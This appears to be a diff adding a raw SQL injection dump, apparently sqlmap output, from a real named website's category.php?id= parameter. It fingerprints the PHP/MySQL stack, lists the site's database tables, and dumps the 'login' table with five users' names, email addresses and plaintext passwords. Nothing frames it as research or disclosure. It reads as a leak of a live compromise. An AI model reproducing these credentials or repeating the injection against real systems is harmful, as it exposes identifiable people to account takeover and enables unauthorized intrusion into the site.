@@ -1,0 +1,40 @@
+.in India
+
+Brace Coder
+
+https://bracecoder.in/category.php?id=4
+
+the back-end DBMS is MySQL
+web application technology: PHP 7.4.20, PHP, Nginx
+the back-end DBMS: MySQL >= 5.6
+banner: '5.7.34'
+
+available databases [2]:
+[+] bracecoder
+[+] information_schema
+
+Database: bracecoder
+[8 tables]
++-----------------+
+| blog_categories |
+| blogs           |
+| comment         |
+| links           |
+| login           |
+| newsletter      |
+| page_hits       |
+| titles          |
++-----------------+
+
+Database: bracecoder
+Table: login
+[5 entries]
++--------------+------------------------------+-------------+
+| uname        | umail                        | password    |
++--------------+------------------------------+-------------+
+| Muthuk       | muthu@123                    | 12345       |
+| K. Bhavana   | bhavanareddy0059@gmail.com   | Bhavana@123 |
+| Bala_50      | bracecoderofficial@gmail.com | 123456789   |
+| Muthukumaran | muthukumaran2026@gmail.com   | 12345678    |
+| Harini       | hariniraveendran@gmail.com   | harini@09   |
++--------------+------------------------------+-------------+
